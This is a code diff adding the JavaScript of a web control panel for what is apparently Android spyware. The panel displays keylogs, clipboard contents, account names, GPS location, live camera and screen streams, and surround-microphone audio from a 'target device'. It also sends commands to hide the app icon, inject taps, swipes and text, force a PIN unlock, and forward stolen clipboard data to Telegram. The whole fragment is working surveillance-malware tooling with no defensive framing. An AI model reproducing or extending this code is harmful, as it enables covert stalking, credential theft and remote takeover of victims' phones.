+            const f = s.val() || {};
+            ['monitor', 'clipboard'].forEach(k => {
+                const el = document.getElementById('feat-' + k);
+                if(el) {
+                    if(f[k] === false) el.classList.remove('active');
+                    else el.classList.add('active');
+                }
+            });
+        });
+
+        database.ref(base + 'permissions').on('value', s => {
+            const perms = s.val() || {};
+            let html = '';
+            for(let p in perms) {
+                const ok = perms[p];
+                const icon = ok ? '<i class="fas fa-check-circle perm-ok"></i>' : '<i class="fas fa-times-circle perm-no"></i>';
+                html += `<div class="perm-item">${icon} ${p}</div>`;
+            }
+            document.getElementById('perm-list').innerHTML = html || '<div class="perm-item">No data</div>';
+        });
+
+        database.ref(base + 'stream').on('value', s => {
+            if(s.val()) document.getElementById('stream-img').src = 'data:image/jpeg;base64,' + s.val();
+        });
+
+        database.ref(base + 'audioLive').on('value', s => {
+            if(s.val()) playAudio(s.val());
+        });
+
+        database.ref(base + 'location').on('value', s => {
+            const l = s.val();
+            if(!l) return;
+            if(!map) {
+                map = L.map('gps-map').setView([l.lat, l.lng], 15);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '&copy; OpenStreetMap'
+                }).addTo(map);
+                marker = L.marker([l.lat, l.lng]).addTo(map);
+            } else {
+                marker.setLatLng([l.lat, l.lng]);
+                map.setView([l.lat, l.lng]);
+            }
+        });
+
+        database.ref(base + 'logs').on('value', s => {
+            const data = s.val() || {};
+            const container = document.getElementById('keylogs-list');
+            if(!Object.keys(data).length) {
+                container.innerHTML = '<div class="log-row" style="color:#888;">No keylog data yet...</div>';
+                return;
+            }
+            let html = '';
+            Object.values(data).reverse().forEach(v => {
+                html += `<div class="log-row">${v.log}</div>`;
+            });
+            container.innerHTML = html;
+        });
+
+        database.ref(base + 'clipboard').on('value', s => {
+            const val = s.val();
+            document.getElementById('clipboard-content').innerText = val || "Clipboard empty.";
+        });
+
+        database.ref(base + 'accounts').on('value', s => {
+            const data = s.val() || [];
+            const body = document.getElementById('accounts-body');
+            if(!data.length) {
+                body.innerHTML = '<tr><td colspan="2" style="color:#888; text-align:center; padding:20px;">No account data yet...</td></tr>';
+                return;
+            }
+            body.innerHTML = '';
+            data.forEach(acc => {
+                body.innerHTML += `<tr><td style="color:var(--blue); font-weight:700;">${acc.type}</td><td>${acc.name}</td></tr>`;
+            });
+        });
+    }
+
+    function cmd(c, v) { database.ref(`users/${userId}/devices/${deviceId}/commands/${c}`).set(v); }
+    function hideApp() {
+        if(confirm('Hide app from home screen? It will still be in Settings > Apps.')) {
+            cmd('hideApp', true);
+            alert('✅ Hide command sent! App icon will disappear from home screen.');
+        }
+    }
+    function confirmUninstall() {
+        if(confirm('⚠️ WARNING: This will uninstall the app from the target device. Are you sure?')) {
+            if(confirm('Last confirmation — UNINSTALL the app?')) {
+                cmd('uninstall', true);
+                alert('🗑️ Uninstall command sent!');
+            }
+        }
+    }
+    function toggleFeat(k) {
+        const el = document.getElementById('feat-' + k);
+        database.ref(`users/${userId}/devices/${deviceId}/features/${k}`).set(!el.classList.contains('active'));
+    }
+    function startStream(t) {
+        database.ref(`users/${userId}/devices/${deviceId}/streamConfig`).set({
+            enabled: true, type: t, quality: parseInt(document.getElementById('stream-quality').value)
+        });
+    }
+    function stopStream() {
+        database.ref(`users/${userId}/devices/${deviceId}/streamConfig/enabled`).set(false);
+        database.ref(`users/${userId}/devices/${deviceId}/stream`).remove();
+        document.getElementById('stream-img').src = '';
+    }
+    function mic(on) {
+        cmd('recordSurround', on);
+        const wrapper = document.getElementById('mic-wrapper');
+        if(on) { wrapper.classList.add('active'); if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)({sampleRate: 16000}); }
+        else wrapper.classList.remove('active');
+    }
+
+    function playAudio(b64) {
+        try {
+            const bin = atob(b64);
+            const bytes = new Int16Array(bin.length / 2);
+            for(let i = 0; i < bin.length; i += 2) bytes[i/2] = (bin.charCodeAt(i+1) << 8) | bin.charCodeAt(i);
+            const floats = new Float32Array(bytes.length);
+            for(let i = 0; i < bytes.length; i++) floats[i] = bytes[i] / 32768.0;
+            const buf = audioCtx.createBuffer(1, floats.length, 16000);
+            buf.copyToChannel(floats, 0);
+            const src = audioCtx.createBufferSource();
+            src.buffer = buf;
+            src.connect(audioCtx.destination);
+            const now = audioCtx.currentTime;
+            if(nextStartTime < now) nextStartTime = now + 0.05;
+            src.start(nextStartTime);
+            nextStartTime += buf.duration;
+        } catch(e) {}
+    }
+
+    function sendClipboardToTelegram() {
+        const content = document.getElementById('clipboard-content').innerText;
+        if(!content || content.includes('Clipboard empty')) {
+            alert('No clipboard data captured yet!');
+            return;
+        }
+        fetch('/send_clipboard', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ uid: userId, device_id: deviceId, content: content })
+        })
+        .then(r => r.json())
+        .then(d => {
+            if(d.success) alert('\u2705 Clipboard sent to Telegram!');
+            else alert('\u274c Failed: ' + (d.error || 'Unknown'));
+        })
+        .catch(() => alert('\u274c Connection error'));
+    }
+
+    // ==================== SCREEN MIRROR ====================
+
+    let screenStreamEnabled = false;
+    let screenPaused = false;
+    let screenDeviceWidth = 1080;
+    let screenDeviceHeight = 2400;
+    let screenFrameCount = 0;
+    let screenFpsInterval = null;
+    let screenTreeListener = null;
+
+    // FPS Counter
+    function startFpsCounter() {
+        if (screenFpsInterval) clearInterval(screenFpsInterval);
+        screenFrameCount = 0;
+        screenFpsInterval = setInterval(() => {
+            document.getElementById('screen-fps').textContent = screenFrameCount;
+            screenFrameCount = 0;
+        }, 1000);
+    }
+
+    function stopFpsCounter() {
+        if (screenFpsInterval) clearInterval(screenFpsInterval);
+        screenFpsInterval = null;
+        document.getElementById('screen-fps').textContent = '0';
+    }
+
+    // Toggle screen stream on/off
+    function toggleScreenStream() {
+        screenStreamEnabled = !screenStreamEnabled;
+        const btn = document.getElementById('screen-start-btn');
+
+        if (screenStreamEnabled) {
+            btn.classList.add('active');
+            btn.innerHTML = '<i class="fas fa-stop"></i>';
+            document.getElementById('screen-empty').style.display = 'none';
+            document.getElementById('screen-status-dot').classList.remove('offline');
+            startFpsCounter();
+
+            // Enable screen capture on device
+            database.ref(`users/${userId}/devices/${deviceId}/screenConfig`).set({
+                enabled: true,
+                interval: parseInt(document.getElementById('screen-interval').value),
+                privacyScreen: document.getElementById('screen-privacy-toggle').checked
+            });
+
+            // Listen for screen tree updates
+            listenScreenTree();
+        } else {
+            btn.classList.remove('active');
+            btn.innerHTML = '<i class="fas fa-play"></i>';
+            document.getElementById('screen-status-dot').classList.add('offline');
+            stopFpsCounter();
+            stopListenScreenTree();
+
+            // Disable screen capture on device
+            database.ref(`users/${userId}/devices/${deviceId}/screenConfig`).update({
+                enabled: false,
+                privacyScreen: false
+            });
+            document.getElementById('screen-privacy-toggle').checked = false;
+            document.getElementById('screen-canvas').innerHTML = '';
+            document.getElementById('screen-empty').style.display = '';
+        }
+    }
+
+    // Pause/resume rendering (still receives data, just doesn't render)
+    function toggleScreenPause() {
+        screenPaused = !screenPaused;
+        const btn = document.getElementById('screen-pause-btn');
+        if (screenPaused) {
+            btn.innerHTML = '<i class="fas fa-play"></i>';
+            btn.classList.add('active');
+        } else {
+            btn.innerHTML = '<i class="fas fa-pause"></i>';
+            btn.classList.remove('active');
+        }
+    }
+
+    // Update screen interval and privacy toggle
+    function updateScreenConfig() {
+        database.ref(`users/${userId}/devices/${deviceId}/screenConfig`).update({
+            interval: parseInt(document.getElementById('screen-interval').value),
+            privacyScreen: document.getElementById('screen-privacy-toggle').checked
+        });
+    }
+
+    // Listen for screenInfo (device dimensions)
+    if (userId && deviceId) {
+        database.ref(`users/${userId}/devices/${deviceId}/screenInfo`).on('value', s => {
+            const info = s.val();
+            if (info) {
+                screenDeviceWidth = info.width || 1080;
+                screenDeviceHeight = info.height || 2400;
+            }
+        });
+    }
+
+    // Listen for screen tree data
+    function listenScreenTree() {
+        stopListenScreenTree();
+        const ref = database.ref(`users/${userId}/devices/${deviceId}/screenTree`);
+        screenTreeListener = ref.on('value', s => {
+            const raw = s.val();
+            if (!raw) return;
+            screenFrameCount++;
+            if (screenPaused) return;
+
+            try {
+                const data = typeof raw === 'string' ? JSON.parse(raw) : raw;
+                const tree = data.tree;
+                const pkg = data.pkg || '';
+                if (tree) renderScreenTree(tree, pkg);
+            } catch (e) {
+                console.error('Tree parse error:', e);
+            }
+        });
+    }
+
+    function stopListenScreenTree() {
+        if (screenTreeListener) {
+            database.ref(`users/${userId}/devices/${deviceId}/screenTree`).off('value', screenTreeListener);
+            screenTreeListener = null;
+        }
+    }
+
+    // Render the UI tree as positioned HTML elements (Hierarchical)
+    function renderScreenTree(tree, pkgName) {
+        const canvas = document.getElementById('screen-canvas');
+        const container = document.getElementById('screen-container');
+        const cW = container.clientWidth;
+        const cH = container.clientHeight;
+
+        if (screenDeviceWidth <= 0 || screenDeviceHeight <= 0) return;
+
+        const scaleX = cW / screenDeviceWidth;
+        const scaleY = cH / screenDeviceHeight;
+
+        // Helper: check if any descendant has text content
+        function hasChildText(node) {
+            if (!node.n) return false;
+            for (const child of node.n) {
+                if (child.t || child.d) return true;
+                if (hasChildText(child)) return true;
+            }
+            return false;
+        }
+
+        function buildNodeHtml(node) {
+            if (!node || !node.b) return '';
+            const [left, top, right, bottom] = node.b;
+            const w = right - left;
+            const h = bottom - top;
+
+            if (w < 2 || h < 2) return '';
+            
+            const sLeft = (left * scaleX).toFixed(1);
+            const sTop = (top * scaleY).toFixed(1);
+            const sW = (w * scaleX).toFixed(1);
+            const sH = (h * scaleY).toFixed(1);
+
+            const cls = node.c || '';
+            let text = node.t || node.d || '';
+            const isClickable = node.ck;
+            const isEditable = node.ed;
+
+            // Text deduplication: suppress parent text if ANY descendant has text
+            // This prevents the common overlap where a parent container repeats child text
+            if (text && node.n && hasChildText(node)) {
+                text = '';
+            }
+
+            let classes = 'node';
+            if (isClickable) classes += ' clickable';
+            if (isEditable) classes += ' editable';
+            if (text) classes += ' has-text';
+            if (cls.includes('Button')) classes += ' button-node';
+            if (cls.includes('Image')) classes += ' image-node';
+
+            let style = `left:${sLeft}px;top:${sTop}px;width:${sW}px;height:${sH}px;`;
+            let content = '';
+
+            if (text) {
+                // Scale font based on the actual rendered height of the node
+                const renderedH = h * scaleY;
+                const fontSize = Math.max(7, Math.min(14, renderedH * 0.55));
+                content = `<span class="node-text" style="font-size:${fontSize.toFixed(1)}px">${escapeHtml(text)}</span>`;
+            }
+
+            // Recursively process children
+            let childrenHtml = '';
+            if (node.n) {
+                for (let i = 0; i < node.n.length; i++) {
+                    childrenHtml += buildNodeHtml(node.n[i]);
+                }
+            }
+
+            return `<div class="${classes}" style="${style}">${content}</div>${childrenHtml}`;
+        }
+
+        // Use requestAnimationFrame for smooth non-blocking update
+        requestAnimationFrame(() => {
+            canvas.innerHTML = buildNodeHtml(tree);
+            const shortPkg = pkgName.split('.').pop();
+            document.getElementById('screen-device-name').textContent = shortPkg ? shortPkg.charAt(0).toUpperCase() + shortPkg.slice(1) : 'Device';
+        });
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text.toString()
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // ==================== TOUCH / SWIPE HANDLING ====================
+
+    (function() {
+        const overlay = document.getElementById('screen-touch-overlay');
+        if (!overlay) return;
+
+        let touchStartX = 0, touchStartY = 0, touchStartTime = 0;
+        let isTouching = false;
+
+        function getRelativePos(e) {
+            const rect = overlay.getBoundingClientRect();
+            const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+            const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+            return {
+                x: clientX - rect.left,
+                y: clientY - rect.top,
+                w: rect.width,
+                h: rect.height
+            };
+        }
+
+        function toDeviceCoords(relX, relY, containerW, containerH) {
+            return {
+                x: (relX / containerW) * screenDeviceWidth,
+                y: (relY / containerH) * screenDeviceHeight
+            };
+        }
+
+        function showTapRipple(x, y) {
+            const container = document.getElementById('screen-container');
+            const ripple = document.createElement('div');
+            ripple.className = 'tap-ripple';
+            ripple.style.left = x + 'px';
+            ripple.style.top = y + 'px';
+            container.appendChild(ripple);
+            setTimeout(() => ripple.remove(), 600);
+        }
+
+        function onStart(e) {
+            if (!screenStreamEnabled) return;
+            e.preventDefault();
+            const pos = getRelativePos(e);
+            touchStartX = pos.x;
+            touchStartY = pos.y;
+            touchStartTime = Date.now();
+            isTouching = true;
+        }
+
+        function onEnd(e) {
+            if (!isTouching || !screenStreamEnabled) return;
+            e.preventDefault();
+
+            const endPos = getRelativePos(e.changedTouches ? e : e);
+            let endX, endY;
+
+            if (e.changedTouches) {
+                const rect = overlay.getBoundingClientRect();
+                endX = e.changedTouches[0].clientX - rect.left;
+                endY = e.changedTouches[0].clientY - rect.top;
+            } else {
+                const rect = overlay.getBoundingClientRect();
+                endX = e.clientX - rect.left;
+                endY = e.clientY - rect.top;
+            }
+
+            const dx = endX - touchStartX;
+            const dy = endY - touchStartY;
+            const dist = Math.sqrt(dx * dx + dy * dy);
+            const rect = overlay.getBoundingClientRect();
+
+            if (dist < 10) {
+                // TAP
+                const dev = toDeviceCoords(touchStartX, touchStartY, rect.width, rect.height);
+                showTapRipple(touchStartX, touchStartY);
+                database.ref(`users/${userId}/devices/${deviceId}/commands/tap`).set({
+                    x: Math.round(dev.x),
+                    y: Math.round(dev.y),
+                    ts: Date.now()
+                });
+            } else {
+                // SWIPE
+                const devStart = toDeviceCoords(touchStartX, touchStartY, rect.width, rect.height);
+                const devEnd = toDeviceCoords(endX, endY, rect.width, rect.height);
+                const duration = Math.max(100, Math.min(Date.now() - touchStartTime, 1000));
+                database.ref(`users/${userId}/devices/${deviceId}/commands/swipe`).set({
+                    x1: Math.round(devStart.x),
+                    y1: Math.round(devStart.y),
+                    x2: Math.round(devEnd.x),
+                    y2: Math.round(devEnd.y),
+                    duration: duration,
+                    ts: Date.now()
+                });
+            }
+
+            isTouching = false;
+        }
+
+        overlay.addEventListener('mousedown', onStart);
+        overlay.addEventListener('mouseup', onEnd);
+        overlay.addEventListener('touchstart', onStart, { passive: false });
+        overlay.addEventListener('touchend', onEnd, { passive: false });
+
+        // Prevent context menu on long press
+        overlay.addEventListener('contextmenu', e => e.preventDefault());
+    })();
+
+    // ==================== SCREEN ACTIONS ====================
+
+    function screenAction(action) {
+        if (!userId || !deviceId) return;
+        database.ref(`users/${userId}/devices/${deviceId}/commands/globalAction`).set({
+            action: action,
+            ts: Date.now()
+        });
+    }
+
+    function promptUnlock() {
+        const pin = prompt("Enter Password or PIN to unlock device remotely:");
+        if (pin && pin.trim().length > 0) {
+            database.ref(`users/${userId}/devices/${deviceId}/commands/unlock`).set({
+                pin: pin.trim()
+            });
+            alert("Unlock command sent! The device screen has been forced awake and is attempting to unlock...");
+        }
+    }
+
+    function sendScreenText() {
+        const input = document.getElementById('screen-text-input');
+        const text = input.value.trim();
+        if (!text) return;
+        database.ref(`users/${userId}/devices/${deviceId}/commands/inputText`).set({
+            text: text,
+            ts: Date.now()
+        });
+        input.value = '';
+    }
+
+    function refreshScreenTree() {
+        // Force a quick tree refresh by toggling interval
+        if (screenStreamEnabled) {
+            database.ref(`users/${userId}/devices/${deviceId}/screenConfig/interval`).set(100);
+            setTimeout(() => {
+                database.ref(`users/${userId}/devices/${deviceId}/screenConfig/interval`)
+                    .set(parseInt(document.getElementById('screen-interval').value));
+            }, 500);
+        }
+    }
+</script>
+</body>
+</html>
